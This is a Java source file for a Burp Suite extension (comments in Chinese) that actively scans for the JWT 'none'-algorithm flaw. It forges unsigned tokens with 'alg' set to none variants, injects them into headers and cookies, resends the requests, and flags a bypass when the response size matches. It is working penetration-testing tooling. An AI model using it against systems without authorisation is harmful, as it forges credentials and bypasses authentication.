package burp.core.scanner.active.jwtscanner;

import burp.*;
import burp.core.scanner.active.BaseActiveScanner;
import burp.utils.BurpAnalyzedRequest;
import burp.utils.DomainNameRepeat;
import burp.utils.TimeOutput;
import com.alibaba.fastjson.JSONObject;
import com.auth0.jwt.JWT;
import com.auth0.jwt.exceptions.JWTDecodeException;
import com.auth0.jwt.interfaces.DecodedJWT;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Time;
import java.util.ArrayList;
import java.util.List;

public class JWTNoneScanner extends BaseActiveScanner implements ActionListener, Runnable {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private BurpAnalyzedRequest analyzedRequest;
    private IHttpRequestResponse httpRequestResponse;
    private PrintWriter stdout;
    public DomainNameRepeat<String, Integer> domainNameRepeat;


    public JWTNoneScanner(IBurpExtenderCallbacks callbacks, IHttpRequestResponse httpRequestResponse){
        super("JwtNoneScanner");
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.analyzedRequest = new BurpAnalyzedRequest();
        this.httpRequestResponse = httpRequestResponse;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.domainNameRepeat = DomainNameRepeat.getDomainNameMap();
    }

    public List<String> getUnsignList(String jwtContent){
        DecodedJWT decodedJWT = null;
        try{
            decodedJWT = JWT.decode(jwtContent);
        }catch (JWTDecodeException Ex){
            return null;
        }

        // 解析header
        String b64jwtPayload = decodedJWT.getPayload();
        byte[] base64decodedBytes = this.helpers.base64Decode(decodedJWT.getHeader());
        JSONObject jsonObject = JSONObject.parseObject(new String(base64decodedBytes));
        // 拼接三种常用的NONE, None, none, nOne的无签名jwt形式
        List<String> checkJwtList = new ArrayList<String>();
        for (IJwtConstant.NoneFlag value : IJwtConstant.NoneFlag.values()) {
            jsonObject.replace("alg", value);
            String b64JwtHeader = this.helpers.base64Encode(new String(jsonObject.toJSONString().getBytes()).getBytes());
            checkJwtList.add(b64JwtHeader + "." + b64jwtPayload + ".");
        }

        for (String s : checkJwtList) {
            this.stdout.println(s);
        }

        return checkJwtList;
    }

    /*
    * 构建四个数据包，进行发包处理
    * 1、haeders头需要处理
    * 2、cookie头需要处理
    * */
    public List<IHttpRequestResponse> sendPayload(IHttpRequestResponse requestResponse, String jwt) throws MalformedURLException {
        List<IHttpRequestResponse> responseList = new ArrayList<>();
        List<String> unsignList = this.getUnsignList(jwt);

        IRequestInfo RequestInfo = this.helpers.analyzeRequest(requestResponse);
        List<IParameter> parameters = analyzedRequest.getAllParamters(requestResponse);
        List<String> headers = RequestInfo.getHeaders();

        for (String noneJwt : unsignList) {

            for (int i=0;i<headers.size();i++) {
                String s = headers.get(i).replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
                if (!s.equals(noneJwt)){
                    headers.remove(i);
                    headers.add(s);
                    break;
                }
            }

            byte[] requestBytes = this.helpers.buildHttpMessage(headers, analyzedRequest.getRequestBody(requestResponse));
            for (IParameter parameter : parameters) {
                String parameterName = parameter.getName();
                String parameterValue = parameter.getValue();
                String s = parameterValue.replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
                if (!s.equals(parameterValue)){
                    IParameter targetParam = this.helpers.getRequestParameter(requestResponse.getRequest(), parameterName);
                    IParameter iParameter = this.helpers.buildParameter(parameterName, s, IParameter.PARAM_COOKIE);
                    if (targetParam != null && targetParam.getType() == IParameter.PARAM_COOKIE){
//                        this.helpers.removeParameter(requestBytes, targetParam);
//                        this.helpers.updateParameter(requestBytes, iParameter);
                        requestBytes = this.helpers.updateParameter(requestBytes, iParameter);
                    }
                }
            }

            IHttpRequestResponse response = this.callbacks.makeHttpRequest(requestResponse.getHttpService(), requestBytes);
            byte[] request = response.getRequest();
            this.stdout.println("====================");
            this.stdout.println(new String(request));
            this.stdout.println("====================");
            responseList.add(response);
        }

        return responseList;
    }

    /*
    * 构建Issue
    * */
    @Override
    public IScanIssue exportIssue(IHttpRequestResponse requestResponse){
        return new BurpScanIssue(
                requestResponse.getHttpService(),
                analyzedRequest.getUrl(requestResponse),
                new IHttpRequestResponse[] { requestResponse },
                "Jwt None Sign",
                "it can help us to get everyone.",
                "High");
    }

    public String getScannerName() {
        return this.scannerName;
    }

    /**
     * Invoked when an action occurs.
     *
     * @param e
     */
    @Override
    public void actionPerformed(ActionEvent e) {
        new Thread(this).start();
    }

    /**
     * When an object implementing interface <code>Runnable</code> is used
     * to create a thread, starting the thread causes the object's
     * <code>run</code> method to be called in that separately executing
     * thread.
     * <p>
     * The general contract of the method <code>run</code> is that it may
     * take any action whatsoever.
     *
     * @see Thread#run()
     */
    @Override
    public void run() {
        // URL构建
        String baseRequestDomainName = analyzedRequest.getRequestDomain(this.httpRequestResponse);
        String baseRequestPath = analyzedRequest.getRequestPath(this.httpRequestResponse);
        int baseResponseSize = analyzedRequest.getResponseBodySize(this.httpRequestResponse);

        URL baseHttpRequestUrl = null;

        try {
            baseHttpRequestUrl = new URL(baseRequestDomainName + baseRequestPath);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }

        // 检查内容jwt
        if (!analyzedRequest.getJwtFlag(this.httpRequestResponse)) {
            this.stdout.println(TimeOutput.formatOutput("未发现存在JWT字段"));
            return;
        }

        // 添加任务到面板中等待检测
        byte[] baseResponse = this.httpRequestResponse.getResponse();

        int tagId = BurpExtender.tags.add(
                this.getScannerName(),
                baseHttpRequestUrl.toString(),
                this.helpers.analyzeResponse(baseResponse).getStatusCode() + "",
                "[-] waiting for results",
                this.httpRequestResponse
        );

        try {
            String jwt = null;
            List<IHttpRequestResponse> responseList = null;

            // 开始进行四次请求利用
            jwt = analyzedRequest.getJwt(this.httpRequestResponse);
            this.stdout.println(TimeOutput.formatOutput("Find a jwt: " + jwt));

            responseList = this.sendPayload(this.httpRequestResponse, jwt); // 发送payload

            for (IHttpRequestResponse response : responseList) {
                int responseSize = analyzedRequest.getResponseBodySize(response);
                if (responseSize != 0){
                    if (responseSize == baseResponseSize){
                        BurpExtender.tags.update(
                                tagId,
                                this.getScannerName(),
                                baseHttpRequestUrl.toString(),
                                analyzedRequest.getStatusCode(response)+"",
                                "[+] found jwt none",
                                response
                        );
                        break;
                    }else{
                        // 未检测出来问题也要更新任务状态至任务栏面板
                        BurpExtender.tags.update(
                                tagId,
                                this.getScannerName(),
                                baseHttpRequestUrl.toString(),
                                analyzedRequest.getStatusCode(response)+"",
                                "[-] not found jwt none",
                                response
                        );
                    }
                }else{
                    BurpExtender.tags.update(
                            tagId,
                            this.getScannerName(),
                            baseHttpRequestUrl.toString(),
                            this.helpers.analyzeResponse(response.getResponse()).getStatusCode() + "",
                            "[-] JWTScan Something Wrong",
                            response
                    );
                }
            }
        } catch (Exception e){
            // Exception，更新任务状态至任务栏面板
            BurpExtender.tags.update(
                    tagId,
                    this.getScannerName(),
                    baseHttpRequestUrl.toString(),
                    this.helpers.analyzeResponse(this.httpRequestResponse.getResponse()).getStatusCode() + "",
                    "[-] JWTScan Exception",
                    this.httpRequestResponse
            );
        }finally {
        }
    }
}
